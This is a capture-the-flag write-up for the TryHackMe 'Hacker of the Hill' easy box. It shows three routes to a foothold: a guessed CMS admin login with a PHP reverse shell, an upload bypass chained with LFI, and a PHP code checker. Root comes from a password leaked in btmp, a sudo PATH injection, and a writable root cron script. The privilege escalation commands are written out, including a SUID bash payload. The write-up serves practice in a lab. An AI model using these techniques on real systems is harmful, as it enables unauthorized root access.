---
title: "THM: Hacker of the Hill (Easy) "
last_modified_at: 2021-03-02
categories:
  - THM
author_profile: false
tags:
  - Linux Privilege Escalation
  - Vulnerable Web Application
  - Sudo Path Injection
  - Cron
  - THM
  - Writeup
---

Hacker Of The Hill Easy box. 

![/assets/images/TryHackMe/hackerofthehill_easy/Untitled.png](/assets/images/TryHackMe/hackerofthehill_easy/Untitled.png)

# Nmap Scan

```bash
# Nmap 7.60 scan initiated Wed Feb 24 20:37:27 2021 as: nmap -sC -sV -A -o nmap_full -p- --min-rate=3000 10.10.125.30                                                                                              
Warning: 10.10.125.30 giving up on port because retransmission cap hit (10).                                                                                                                                       
Nmap scan report for 10.10.125.30                                                                                                                                                                                  
Host is up (0.17s latency).                                                                                                                                                                                        
Not shown: 65529 closed ports                                                                                                                                                                                      
PORT     STATE SERVICE VERSION                                                                                                                                                                                     
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                            
|   2048 f7:75:95:c7:6d:f4:92:a0:0e:1e:60:b8:be:4d:92:b1 (RSA)            
|   256 a2:11:fb:e8:c5:c6:f8:98:b3:f8:d3:e3:91:56:b2:34 (ECDSA)           
|_  256 72:19:b7:04:4c:df:18:be:6b:0f:9d:da:d5:14:68:c5 (EdDSA)           
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))                     
|_http-server-header: Apache/2.4.29 (Ubuntu)                              
|_http-title: Apache2 Ubuntu Default Page: It works                       
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))                     
| http-robots.txt: 1 disallowed entry                                     
|_/vbcms                                                                  
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: VeryBasicCMS - Home                                                                  
8001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)                               
| http-title: My Website                                                   
|_Requested resource was /?page=home.php                                   
8002/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))                      
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Learn PHP
9999/tcp open  abyss?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 200 OK
|     Date: Wed, 24 Feb 2021 14:55:10 GMT
|     Content-Length: 0
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     Date: Wed, 24 Feb 2021 14:55:09 GMT
|_    Content-Length: 0
```

Nmap scan shows port 22 (SSH), 4 HTTP servers and 9999 (koth).

# Enumerating HTTP ports

# Port 80

![/assets/images/TryHackMe/hackerofthehill_easy/Untitled%201.png](/assets/images/TryHackMe/hackerofthehill_easy/Untitled%201.png)

It shows default apache installation page.

Gobuster did not give much information

# Port 8000

```bash
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))                     
| http-robots.txt: 1 disallowed entry                                     
|_/vbcms                                                                  
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: VeryBasicCMS - Home      
```

The robots file shows an entry

![/assets/images/TryHackMe/hackerofthehill_easy/Untitled%202.png](/assets/images/TryHackMe/hackerofthehill_easy/Untitled%202.png)

Default page does not have much information.

![/assets/images/TryHackMe/hackerofthehill_easy/Untitled%203.png](/assets/images/TryHackMe/hackerofthehill_easy/Untitled%203.png)

This has a login page.

Tried common credentials 

`admin : admin` worked.

![/assets/images/TryHackMe/hackerofthehill_easy/Untitled%204.png](/assets/images/TryHackMe/hackerofthehill_easy/Untitled%204.png)

So we can edit pages.

### Editing About page.

![/assets/images/TryHackMe/hackerofthehill_easy/Untitled%205.png](/assets/images/TryHackMe/hackerofthehill_easy/Untitled%205.png)

Added the php reverse shell code.

![/assets/images/TryHackMe/hackerofthehill_easy/Untitled%206.png](/assets/images/TryHackMe/hackerofthehill_easy/Untitled%206.png)

Got a shell

Running linpeas I found 

```bash
[+] Interesting GROUP writable files (not in Home) (max 500)                                               
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files   
  Group serv1:                                                                       
                                                                                    
  Group utmp:                                                                     
**/var/log/btmp**                                                                                                                              
/run/utmp                                                                                                       
/run/screen
```

This file has the **root** password

```bash
serv1@web-serv:/var/log$ cat btmp 
)       ssh:nottyroot**MGQ4NmIy**192.168.1.142ǯ*`
```

Using this got root shell 

```bash
serv1@web-serv:/var/log$ su root
Password:
root@web-serv:/var/log#
```

With this got root using the first user.

# Second Approach

# Port 8001

![/assets/images/TryHackMe/hackerofthehill_easy/Untitled%207.png](/assets/images/TryHackMe/hackerofthehill_easy/Untitled%207.png)

URL shows potential LFI vulnerability.

![/assets/images/TryHackMe/hackerofthehill_easy/Untitled%208.png](/assets/images/TryHackMe/hackerofthehill_easy/Untitled%208.png)

Support page has a upload functionality.

Let's try to upload shell. Even though it shows jpg.

![/assets/images/TryHackMe/hackerofthehill_easy/Untitled%209.png](/assets/images/TryHackMe/hackerofthehill_easy/Untitled%209.png)

Uploading php file shows this. Let's try to bypass this first.

Changing the file extension to `.jpg` shows invalid content type detected

![/assets/images/TryHackMe/hackerofthehill_easy/Untitled%2010.png](/assets/images/TryHackMe/hackerofthehill_easy/Untitled%2010.png)

Let's change the content type to `image/jpeg`

![/assets/images/TryHackMe/hackerofthehill_easy/Untitled%2011.png](/assets/images/TryHackMe/hackerofthehill_easy/Untitled%2011.png)

This bypassed the restriction and we have the uploaded image's location

`/uploads/184317609d21f04fb5e3b779e1acfd36.jpg`

Now let's use the LFI to get the shell

![/assets/images/TryHackMe/hackerofthehill_easy/Untitled%2012.png](/assets/images/TryHackMe/hackerofthehill_easy/Untitled%2012.png)

Now we are in the machine let's enumerate

# Creating Stable Shell

```bash
$ python3 -c "import pty;pty.spawn('/bin/bash')"
ctrl +z 
$ stty raw -echo;fg

$ export TERM=xterm
```

Now we have a stable shell

Also, there is a sudoer's entry

```bash
serv2@web-serv:/home/serv3/backups$ sudo -l
Matching Defaults entries for serv2 on web-serv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv2 may run the following commands on web-serv:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/restartServer
```

Let's have a look at `/usr/bin/restartServer`

```bash
serv2@web-serv:/home/serv2$ cat /usr/bin/restartServer 
#!/bin/sh
systemctl restart apache2.service
```

Here we can see that `systemctl` has a relative path and the sudoers entry shows that we can set the environment variables `SETENV`.

So in order to exploit this we can create a `systemctl` executable with payload and set the `PATH` to the directory containing the payload.

`PATH` environment variable is used to determine where to look for the executables. For example, if we run `ls` , linux first looks at the directories in the `PATH` variable and looks for executables with name `ls` inside them.

## Payload to exploit

```bash
serv2@web-serv:/home/serv2$ cat systemctl 
#!/bin/bash
cp /bin/bash /tmp/bash
chmod +xs /tmp/bash
```

This copies /bin/bash to /tmp/bash and adds SUID to the /tmp/bash

Now we need to run the `/usr/bin/restartServer` as root by setting `PATH` Environment variable.

Let's look at the path.

```bash
serv2@web-serv:/home/serv2$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

We need to append the original path as we want the root user to run `cp` and  `chmod` commands as well.

# Getting Root Shell

```bash
serv2@web-serv:/home/serv2$ sudo PATH=/home/serv2:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin /usr/bin/restartServer
```

After running this we get a `SUID` bash in `/tmp/bash`

```bash
serv2@web-serv:/home/serv2$ ls -la /tmp
total 1096
drwxrwxrwt  2 root root    4096 Feb 24 15:35 .
drwxr-xr-x 23 root root    4096 Feb 15 01:01 ..
-rwsr-sr-x  1 root root 1113504 Feb 24 15:32 bash
```

Using this we can be root

```bash
serv2@web-serv:/home/serv2$ /tmp/bash -p
bash-4.4# id
uid=1001(serv2) gid=1001(serv2) **euid=0(root) egid=0(root) groups=0(root)**,1001(serv2)
bash-4.4# ls -la /root
total 28
drwx------  4 root root 4096 Feb 17 22:27 .
drwxr-xr-x 23 root root 4096 Feb 15 01:01 ..
lrwxrwxrwx  1 root root    9 Feb 15 00:43 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Feb 15 00:43 .cache
drwx------  3 root root 4096 Feb 15 00:43 .gnupg
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root    0 Feb 17 22:27 king.txt
**-r--------  1 root root   38 Feb 15 19:19 root.txt**
```

The challenge said it has three methods to gain root and initial foothold. Let's look at another method

# Third Approach

# Port 8002

![/assets/images/TryHackMe/hackerofthehill_easy/Untitled%2013.png](/assets/images/TryHackMe/hackerofthehill_easy/Untitled%2013.png)

`/lesson/1` has a php code checker. Let's try running system.

![/assets/images/TryHackMe/hackerofthehill_easy/Untitled%2014.png](/assets/images/TryHackMe/hackerofthehill_easy/Untitled%2014.png)

This runs as server3 let's try to get shell

![/assets/images/TryHackMe/hackerofthehill_easy/Untitled%2015.png](/assets/images/TryHackMe/hackerofthehill_easy/Untitled%2015.png)

# Crontab Entry

While enumerating the machine, I found a cron running as root

```bash
serv2@web-serv:/home/serv2$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /home/serv3/backups/backup.sh
```

The [backup.sh](http://backup.sh) inside the serv3 is running as root.

Let's have a look at that file

```bash
serv2@web-serv:/home/serv3/backups$ ls -la
total 16
drwxr-xr-x 3 serv3 serv3 4096 Feb 15 01:02 .
drwxr-xr-x 3 serv3 serv3 4096 Feb 15 02:02 ..
-r-xr-xr-x 1 serv3 serv3   52 Feb 15 01:02 backup.sh
drwxr-xr-x 2 serv3 serv3 4096 Feb 15 01:01 files
```

This is writeable by serv3 so if we can escalate to serv3 we can get the shell.

```bash
serv2@web-serv:/home/serv3/backups$ cat backup.sh 
#!/bin/bash
mv /backups/* /home/serv3/backups/files
```

Since it has a file running as root. Let's modify that file and get root access with this method.

`/home/serv3/backups/backup.sh` is running as root. 

Using the same payload as above

```bash
#!/bin/bash
cp /bin/bash /tmp/bash
chmod +xs /tmp/bash
```

We get root access.

# Final Thoughts

I used the second approach to get the shell first and then the third to get root. The challenges were pretty easy, there were not many restrictions in the file upload. The credentials were very guessable. Finding the flags was a bit difficult. Two flags were hidden, the hints helped me get those flags.